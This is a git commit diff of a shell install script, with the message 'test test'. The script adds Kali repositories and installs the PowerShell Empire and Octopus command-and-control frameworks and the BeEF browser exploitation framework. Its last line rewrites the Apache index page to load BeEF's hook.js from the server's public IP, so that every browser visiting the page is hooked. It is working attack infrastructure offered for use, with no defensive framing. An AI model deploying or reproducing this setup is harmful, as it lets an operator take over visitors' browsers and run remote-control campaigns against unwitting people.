fd406bdc941ab56964cba22b99ebe35c10b88306
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2020-07-01 04:01:54 +0200

    test
    test

--- install.sh
+++ install.sh
@@ -1,10 +1,12 @@
-apt update && sudo apt full-upgrade -y
+apt update && sudo apt upgrade -y
 apt install gnupg
 echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list
 wget 'https://archive.kali.org/archive-key.asc'
 sudo apt-key add archive-key.asc
-apt update && sudo apt full-upgrade -y
-apt install powershell-empire beef-xss apache2 -y 
+apt update && sudo apt upgrade -y
+apt install powershell-empire -y
+apt install beef-xss -y
+apt install apache2 -y 
 apt update; apt install git -y; git clone https://github.com/mhaskar/Octopus/ /opt/Octopus; cd /opt/Octopus/; apt install python3-pip -y ; export LC_ALL=C ;  pip3 install -r requirements.txt;apt install mono-devel -y
 mv /var/www/html/index.html /var/www/html/index.html.bak
 echo "<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
